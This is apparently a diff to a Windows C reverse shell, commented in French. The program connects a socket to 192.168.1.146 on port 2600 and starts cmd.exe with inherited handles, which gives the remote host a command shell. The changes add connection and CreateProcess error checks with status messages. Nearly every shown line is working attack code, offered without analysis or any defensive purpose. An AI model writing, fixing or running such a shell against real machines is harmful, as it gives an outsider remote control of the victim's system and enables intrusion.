@@ -33,20 +33,24 @@ int main(){
     server.sin_port = htons(2600);
     server.sin_addr.s_addr = inet_addr("192.168.1.146");
 
-    connect(soc, (struct sockaddr *)&server, sizeof(server));
+    // 1. On vérifie si la connexion marche vraiment
+    if (connect(soc, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
+        printf("[!] Erreur de connexion.\n");
+        return 1;
+    }
+    printf("[+] Connecte au serveur !\n");
 
-    CreateProcessA(
-    NULL,           // lpApplicationName
-    command,        // lpCommandLine ("cmd.exe")
-    NULL,           // lpProcessAttributes
-    NULL,           // lpThreadAttributes
-    TRUE,           // bInheritHandles (Le plus important : autorise la transmission du socket)
-    0,              // dwCreationFlags
-    NULL,           // lpEnvironment
-    NULL,           // lpCurrentDirectory
-    &sinfo,         // lpStartupInfo (Le formulaire que tu as rempli)
-    &pinfo          // lpProcessInformation (Le formulaire de retour)
-);
+    // 2. On lance cmd.exe et on VÉRIFIE s'il a réussi
+    if (!CreateProcessA(
+        NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo
+    )) {
+        // S'il échoue, GetLastError() nous donnera le code d'erreur précis de Windows
+        printf("[!] Erreur CreateProcess: %lu\n", GetLastError());
+        return 1;
+    }
+    printf("[+] CMD.exe lance avec succes. En attente...\n");
+
+    
     WaitForSingleObject(pinfo.hProcess, INFINITE);
     // cleanup
     closesocket(soc);
